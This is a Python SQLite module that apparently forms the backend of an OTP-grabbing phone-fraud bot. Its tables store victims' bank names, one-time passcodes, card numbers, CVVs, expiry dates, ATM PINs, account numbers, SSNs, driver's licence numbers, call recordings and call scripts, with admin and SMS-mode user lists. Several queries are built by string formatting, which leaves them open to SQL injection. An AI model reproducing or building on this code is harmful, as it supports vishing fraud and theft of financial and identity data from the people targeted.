import sqlite3
from datetime import *

path = 'UsersDatabase.db'
conn = sqlite3.connect(path, check_same_thread=False)

c = conn.cursor()

c.execute("""CREATE TABLE IF NOT EXISTS UserData (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        bank_name TEXT,
        phone_no TEXT,
        otp_code INTEGER,
        Recording_url TEXT,
        card_number INTEGER,
        card_cvv INTEGER,
        card_expiry INTEGER,
        account_number INTEGER,
        atm_pin INTEGER,
        option1 TEXT,
        option2 TEXT,
        option3 TEXT,
        option4 TEXT,
        option_number TEXT,
        numbers_collected1 TEXT,
        numbers_collected2 TEXT,
        voice TEXT,
        dl_number TEXT,
        ssn_number TEXT,
        app_number TEXT,
        script TEXT
    )""")

c.execute("""CREATE TABLE IF NOT EXISTS Admindata (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        admin_id INTEGER
   )""")

c.execute("""CREATE TABLE IF NOT EXISTS Smsmode (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER
   )""")

# Database functions
def create_admin(adminid):
    sql = f"INSERT INTO Admindata (admin_id) VALUES ({adminid})"
    c.execute(sql)
    conn.commit()

def create_user(userid):
    sql = f"INSERT INTO UserData (user_id, bank_name, phone_no, otp_code, Recording_url, card_number, card_cvv, card_expiry, account_number, atm_pin, option1, option2, option3, option4, option_number, numbers_collected1, numbers_collected2, voice, dl_number, ssn_number, app_number, script) VALUES ('{userid}', 'Notavailable', 'Notavailable', 0, 'Notavailable', 0, 0, 0, 0, 0, 'Notavailable', 'Notavailable', 'Notavailable', 'Notavailable', 'Notavailable', 'Notavailable', 'Notavailable', 'Notavailable', 'Notavailable', 'Notavailable', 'Notavailable', 'Notavailable')"
    c.execute(sql)
    conn.commit()

def save_phonenumber(phone_no, userid):
    c.execute("UPDATE UserData SET phone_no = ? WHERE user_id = ?", (phone_no, userid))
    conn.commit()

def save_bankName(sbank_N, userid):
    c.execute("UPDATE UserData SET bank_name = ? WHERE user_id = ?", (sbank_N, userid))
    conn.commit()

def save_otpcode(otp_code, userid):
    c.execute("UPDATE UserData SET otp_code = ? WHERE user_id = ?", (otp_code, userid))
    conn.commit()

def save_recordingurl(recording_url, userid):
    c.execute("UPDATE UserData SET Recording_url = ? WHERE user_id = ?", (recording_url, userid))
    conn.commit()

def save_cardnumber(card_number, userid):
    c.execute("UPDATE UserData SET card_number = ? WHERE user_id = ?", (card_number, userid))
    conn.commit()

def save_cardexpiry(card_expiry, userid):
    c.execute("UPDATE UserData SET card_expiry = ? WHERE user_id = ?", (card_expiry, userid))
    conn.commit()

def save_cardcvv(card_cvv, userid):
    c.execute("UPDATE UserData SET card_cvv = ? WHERE user_id = ?", (card_cvv, userid))
    conn.commit()

def save_accountnumber(account_number, userid):
    c.execute("UPDATE UserData SET account_number = ? WHERE user_id = ?", (account_number, userid))
    conn.commit()

def save_atmpin(atm_pin, userid):
    c.execute("UPDATE UserData SET atm_pin = ? WHERE user_id = ?", (atm_pin, userid))
    conn.commit()

def save_option1(option1, userid):
    c.execute("UPDATE UserData SET option1 = ? WHERE user_id = ?", (option1, userid))
    conn.commit()

def save_option2(option2, userid):
    c.execute("UPDATE UserData SET option2 = ? WHERE user_id = ?", (option2, userid))
    conn.commit()

def save_option3(option3, userid):
    c.execute("UPDATE UserData SET option3 = ? WHERE user_id = ?", (option3, userid))
    conn.commit()

def save_option4(option4, userid):
    c.execute("UPDATE UserData SET option4 = ? WHERE user_id = ?", (option4, userid))
    conn.commit()

def save_script(script, userid):
    c.execute("UPDATE UserData SET script = ? WHERE user_id = ?", (script, userid))
    conn.commit()

def save_option_number(option_number, userid):
    c.execute("UPDATE UserData SET option_number = ? WHERE user_id = ?", (option_number, userid))
    conn.commit()

def save_numbercollected1(numbers_collected1, userid):
    c.execute("UPDATE UserData SET numbers_collected1 = ? WHERE user_id = ?", (numbers_collected1, userid))
    conn.commit()

def save_numbercollected2(numbers_collected2, userid):
    c.execute("UPDATE UserData SET numbers_collected2 = ? WHERE user_id = ?", (numbers_collected2, userid))
    conn.commit()

def save_voice(voice, userid):
    c.execute("UPDATE UserData SET voice = ? WHERE user_id = ?", (voice, userid))
    conn.commit()

def save_dlnumber(dlnumber, userid):
    c.execute("UPDATE UserData SET dl_number = ? WHERE user_id = ?", (dlnumber, userid))
    conn.commit()

def save_ssnumber(ssnumber, userid):
    c.execute("UPDATE UserData SET ssn_number = ? WHERE user_id = ?", (ssnumber, userid))
    conn.commit()

def save_applnumber(applnumber, userid):
    c.execute("UPDATE UserData SET app_number = ? WHERE user_id = ?", (applnumber, userid))
    conn.commit()

def fetch_bankname(userid):
    try:
        c.execute(f"SELECT bank_name FROM UserData WHERE user_id = '{userid}'")
        bankname = str(c.fetchone()[0])
        conn.commit()
        return bankname
    except TypeError:
        return 'Notavailable'

def fetch_phonenumber(userid):
    try:
        c.execute(f"SELECT phone_no FROM UserData WHERE user_id = '{userid}'")
        phonenumber = str(c.fetchone()[0])
        conn.commit()
        return phonenumber
    except TypeError:
        return 'Notavailable'

def fetch_otpcode(userid):
    try:
        c.execute(f"SELECT otp_code FROM UserData WHERE user_id = '{userid}'")
        otpcode = str(c.fetchone()[0])
        conn.commit()
        return otpcode
    except TypeError:
        return '0'

def fetch_recordingurl(userid):
    try:
        c.execute(f"SELECT Recording_url FROM UserData WHERE user_id = '{userid}'")
        recordingurl = str(c.fetchone()[0])
        conn.commit()
        return recordingurl
    except TypeError:
        return 'Notavailable'

def fetch_cardnumber(userid):
    try:
        c.execute(f"SELECT card_number FROM UserData WHERE user_id = '{userid}'")
        cardnumber = str(c.fetchone()[0])
        conn.commit()
        return cardnumber
    except TypeError:
        return '?'

def fetch_cardcvv(userid):
    try:
        c.execute(f"SELECT card_cvv FROM UserData WHERE user_id = '{userid}'")
        cardcvv = str(c.fetchone()[0])
        conn.commit()
        return cardcvv
    except TypeError:
        return '0'

def fetch_cardexpiry(userid):
    try:
        c.execute(f"SELECT card_expiry FROM UserData WHERE user_id = '{userid}'")
        cardexpiry = str(c.fetchone()[0])
        conn.commit()
        return cardexpiry
    except TypeError:
        return '0'

def fetch_accountnumber(userid):
    try:
        c.execute(f"SELECT account_number FROM UserData WHERE user_id = '{userid}'")
        accountnumber = str(c.fetchone()[0])
        conn.commit()
        return accountnumber
    except TypeError:
        return '0'

def fetch_atmpin(userid):
    try:
        c.execute(f"SELECT atm_pin FROM UserData WHERE user_id = '{userid}'")
        atmpin = str(c.fetchone()[0])
        conn.commit()
        return atmpin
    except TypeError:
        return '0'

def fetch_option1(userid):
    try:
        c.execute(f"SELECT option1 FROM UserData WHERE user_id = '{userid}'")
        option1 = str(c.fetchone()[0])
        conn.commit()
        return option1
    except TypeError:
        return ''

def fetch_option2(userid):
    try:
        c.execute(f"SELECT option2 FROM UserData WHERE user_id = '{userid}'")
        option2 = str(c.fetchone()[0])
        conn.commit()
        return option2
    except TypeError:
        return ''

def fetch_script(userid):
    try:
        c.execute(f"SELECT script FROM UserData WHERE user_id = '{userid}'")
        script = str(c.fetchone()[0])
        conn.commit()
        return script
    except TypeError:
        return ''

def fetch_option_number(userid):
    try:
        c.execute(f"SELECT option_number FROM UserData WHERE user_id = '{userid}'")
        option_number = str(c.fetchone()[0])
        conn.commit()
        return option_number
    except TypeError:
        return 'Notavailable'

def fetch_numbercollected1(userid):
    try:
        c.execute(f"SELECT numbers_collected1 FROM UserData WHERE user_id = '{userid}'")
        number_collected1 = str(c.fetchone()[0])
        conn.commit()
        return number_collected1
    except TypeError:
        return ''

def fetch_numbercollected2(userid):
    try:
        c.execute(f"SELECT numbers_collected2 FROM UserData WHERE user_id = '{userid}'")
        number_collected2 = str(c.fetchone()[0])
        conn.commit()
        return number_collected2
    except TypeError:
        return ''

def fetch_voice(userid):
    try:
        c.execute(f"SELECT voice FROM UserData WHERE user_id = '{userid}'")
        voice = str(c.fetchone()[0])
        conn.commit()
        return voice
    except TypeError:
        return ''

def fetch_dlnumber(userid):
    try:
        c.execute(f"SELECT dl_number FROM UserData WHERE user_id = '{userid}'")
        dlnumber = str(c.fetchone()[0])
        conn.commit()
        return dlnumber
    except TypeError:
        return 'Notavailable'

def fetch_ssnumber(userid):
    try:
        c.execute(f"SELECT ssn_number FROM UserData WHERE user_id = '{userid}'")
        ssnumber = str(c.fetchone()[0])
        conn.commit()
        return ssnumber
    except TypeError:
        return 'Notavailable'

def fetch_applenumber(userid):
    try:
        c.execute(f"SELECT app_number FROM UserData WHERE user_id = '{userid}'")
        appl_number = str(c.fetchone()[0])
        conn.commit()
        return appl_number
    except TypeError:
        return 'Notavailable'

def userid_fetcher():
    c.execute("SELECT user_id FROM UserData")
    listuserid = c.fetchall()
    conn.commit()
    return listuserid

def userid_fetcher_sms():
    c.execute("SELECT user_id FROM Smsmode")
    listuserid = c.fetchall()
    conn.commit()
    return listuserid

def adminid_fetcher():
    c.execute("SELECT admin_id FROM Admindata")
    listadminid = c.fetchall()
    conn.commit()
    return listadminid

def fetch_UserData_table():
    c.execute("SELECT * FROM UserData")
    table = c.fetchall()
    conn.commit()
    return table

def fetch_Admindata_table():
    c.execute("SELECT * FROM Admindata")
    table = c.fetchall()
    conn.commit()
    return table

def delete_alldata_UserData():
    c.execute("DELETE FROM UserData")
    conn.commit()

def delete_alldata_AdminData():
    c.execute("DELETE FROM Admindata")
    conn.commit()

def delete_specific_UserData(userid):
    c.execute("DELETE FROM UserData WHERE user_id = ?", (userid,))
    conn.commit()

def delete_specific_AdminData(admin_id):
    c.execute("DELETE FROM Admindata WHERE admin_id = ?", (admin_id,))
    conn.commit()

def check_admin(id):
    admin_list = adminid_fetcher()
    for x in admin_list:
        if id in x:
            return True
        else:
            continue
    else:
        return False

def check_user(id):
    user_list = userid_fetcher()
    for x in user_list:
        if id in x:
            return True
        else:
            continue
    else:
        return False

def fetch_sms_userid(phone_no):
    try:
        c.execute(f"SELECT user_id FROM UserData WHERE phone_no = '{phone_no}'")
        userid = str(c.fetchone()[0])
        conn.commit()
        return userid
    except TypeError:
        return 'Notavailable'